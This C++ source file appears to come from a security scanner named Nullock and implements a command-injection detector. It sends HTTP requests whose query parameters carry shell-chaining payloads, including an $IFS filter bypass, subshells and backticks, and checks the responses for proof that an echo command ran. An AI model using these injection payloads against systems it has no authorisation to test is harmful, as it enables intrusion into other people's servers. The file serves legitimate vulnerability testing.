#include "cmd_injection.hpp"
#include "networking.hpp"

#include <QRandomGenerator>
#include <QUrl>
#include <QUrlQuery>

namespace Nullock::Core::CmdInjection {

namespace {

constexpr int kMaxSends   = 130;
constexpr int kMaxParams  = 12;

// How the injected command is chained onto the original. `%1` is the echo
// command body (already carrying the command-substitution proof). POSIX shells;
// cmd.exe / set-/a Windows coverage is tracked as a follow-up.
struct Technique { const char *name; const char *tmpl; };
const QList<Technique> &techniques() {
    static const QList<Technique> t = {
        { "semicolon", "; echo %1" },
        { "pipe",      "| echo %1" },
        { "and",       "&& echo %1" },
        { "or",        "|| echo %1" },
        { "ampersand", "& echo %1" },          // single & (sequential on cmd, bg on POSIX)
        { "newline",   "\necho %1" },
        { "ifs",       ";echo${IFS}%1" },       // space-filter bypass via $IFS
        { "subshell",  "$(echo %1)" },
        { "backtick",  "`echo %1`" },
    };
    return t;
}

// Set `param` to the percent-encoded `value` (the shell metacharacters must be
// encoded so they survive the request line; the server decodes them back).
QString queryWith(const QString &existing, const QString &param, const QString &value) {
    const QByteArray enc = QUrl::toPercentEncoding(value);
    QStringList parts;
    const QUrlQuery q(existing);
    for (const auto &kv : q.queryItems(QUrl::FullyEncoded))
        if (QUrl::fromPercentEncoding(kv.first.toUtf8()) != param)
            parts << kv.first + "=" + kv.second;
    parts << param + "=" + QString::fromUtf8(enc);
    return parts.join('&');
}

QString randTok() {
    static const char a[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    QString s = QStringLiteral("z");
    for (int i = 0; i < 7; ++i) s += a[QRandomGenerator::global()->bounded(int(sizeof(a) - 1))];
    return s;
}

} // namespace

QStringList defaultParams() {
    // Ordered by command-injection yield so the cap keeps the highest-value
    // names; the rest are reported in Result.droppedParams.
    return { "host", "ip", "ping", "domain", "addr", "target", "url", "file",
             "path", "cmd", "exec", "name", "query", "q", "search" };
}

Result test(const Request &reqIn) {
    Result result;
    if (reqIn.host.isEmpty()) { result.error = "host required"; return result; }
    Request req = reqIn;
    if (req.basePath.isEmpty()) req.basePath = QStringLiteral("/");

    QStringList params;
    if (!req.param.isEmpty()) {
        params << req.param;
    } else {
        const QUrlQuery q(req.query);
        for (const auto &kv : q.queryItems())
            if (!params.contains(kv.first)) params << kv.first;
        if (params.isEmpty()) params = defaultParams();
    }
    if (params.size() > kMaxParams) {
        result.droppedParams = params.mid(kMaxParams);   // surfaced so a clean
        params = params.mid(0, kMaxParams);              // result isn't silently partial
    }
    result.testedParams = params;

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto send = [&](const QString &query) {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls, buildRequest(req, query));
    };

    const auto base = send(req.query);
    if (!base.ok) { result.error = "baseline failed: " + base.errorMessage; return result; }
    result.baselineStatus = base.parsed.statusCode;

    auto pick = [] { return QRandomGenerator::global()->bounded(1000u, 9999u); };
    const quint64 a = req.seedA ? req.seedA : pick();
    const quint64 b = req.seedB ? req.seedB : pick();
    const QString product = QString::number(a * b);
    const QString pre = randTok(), suf = randTok();
    // echo body: <pre>$(echo $((a*b)))<suf> -> a real shell prints <pre><product><suf>
    // (command substitution proves a command ran, not just arithmetic expansion).
    const QString echoBody = commandProof(pre, suf, a, b);

    for (const QString &param : params) {
        if (result.requestsSent >= kMaxSends) break;
        for (const Technique &t : techniques()) {
            if (result.requestsSent >= kMaxSends) break;
            // Prefix a benign value so the original command still parses, then
            // chain ours.
            const QString value = QStringLiteral("1") + QString::fromUtf8(t.tmpl).arg(echoBody);
            const auto r = send(queryWith(req.query, param, value));
            if (!r.ok) continue;
            // Executed iff SOME sentinel region (scan ALL -- a raw reflection of
            // the payload may precede the executed output) is EXACTLY the
            // product. Equality rejects literal reflection and substring noise.
            bool hit = false;
            for (const QString &region : renderedRegions(QString::fromUtf8(r.parsed.body), pre, suf))
                if (region.trimmed() == product) { hit = true; break; }
            if (hit) {
                result.hits.append({ param, QString::fromUtf8(t.name), value,
                    QStringLiteral("command executed: $(echo $((%1*%2))) -> %3")
                        .arg(a).arg(b).arg(product) });
                result.vulnerable = true;
                break;   // next param
            }
        }
    }

    return result;
}

} // namespace Nullock::Core::CmdInjection
